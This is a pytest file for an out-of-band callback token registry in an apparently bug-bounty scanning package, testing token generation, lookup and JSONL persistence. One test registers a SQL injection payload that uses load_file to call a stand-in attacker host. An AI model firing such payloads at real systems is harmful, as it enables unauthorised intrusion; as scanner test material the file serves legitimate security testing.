"""Tests for the OOB token registry."""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path
from uuid import uuid4

from bounty_agent.oob import OobToken, TokenRegistry, generate_token


class TestGenerateToken:
    def test_returns_url_safe_string(self) -> None:
        for _ in range(10):
            token = generate_token()
            # Token must be URL-safe (no padding, no slashes)
            assert "=" not in token
            assert "/" not in token
            assert "+" not in token
            assert len(token) > 10

    def test_uniqueness(self) -> None:
        tokens = {generate_token() for _ in range(1000)}
        # 96 bits of entropy: collisions are astronomically unlikely
        assert len(tokens) == 1000


class TestTokenRegistry:
    def test_register_returns_token_record(self) -> None:
        registry = TokenRegistry()
        scan_id = uuid4()
        token = registry.register(
            target_url="https://example.com/api",
            payload="'; SELECT load_file('//x.callback.evil')--",
            category="sql_injection",
            scan_id=scan_id,
        )
        assert token.token
        assert token.target_url == "https://example.com/api"
        assert token.category == "sql_injection"
        assert token.scan_id == str(scan_id)
        assert isinstance(token.created_at, datetime)

    def test_lookup_returns_registered(self) -> None:
        registry = TokenRegistry()
        token = registry.register(
            target_url="https://example.com/",
            payload="payload",
            category="ssrf",
        )
        assert registry.lookup(token.token) == token

    def test_lookup_unknown_returns_none(self) -> None:
        registry = TokenRegistry()
        assert registry.lookup("does-not-exist") is None

    def test_all_tokens_snapshot(self) -> None:
        registry = TokenRegistry()
        registry.register(target_url="a", payload="p", category="c")
        registry.register(target_url="b", payload="p", category="c")
        assert len(registry.all_tokens()) == 2


class TestTokenPersistence:
    def test_register_appends_to_disk(self, tmp_path: Path) -> None:
        path = tmp_path / "tokens.jsonl"
        registry = TokenRegistry(persist_path=path)
        registry.register(target_url="https://e.example/", payload="p", category="c")
        registry.register(target_url="https://f.example/", payload="p", category="c")
        lines = path.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 2
        # Both lines must be valid JSON tokens.
        OobToken.from_jsonl(lines[0])
        OobToken.from_jsonl(lines[1])

    def test_reload_from_disk(self, tmp_path: Path) -> None:
        path = tmp_path / "tokens.jsonl"
        first = TokenRegistry(persist_path=path)
        token = first.register(target_url="x", payload="y", category="z")
        # Simulate process restart: brand new registry, same path.
        second = TokenRegistry(persist_path=path)
        assert second.lookup(token.token) is not None
        assert second.lookup(token.token).target_url == "x"  # type: ignore[union-attr]


class TestOobTokenJsonlRoundTrip:
    def test_roundtrip(self) -> None:
        original = OobToken(
            token="abc123",
            scan_id="s-1",
            target_url="https://example.com/",
            payload="p",
            category="ssrf",
            created_at=datetime(2026, 1, 2, 3, 4, 5, tzinfo=UTC),
        )
        encoded = original.to_jsonl()
        decoded = OobToken.from_jsonl(encoded)
        assert decoded == original
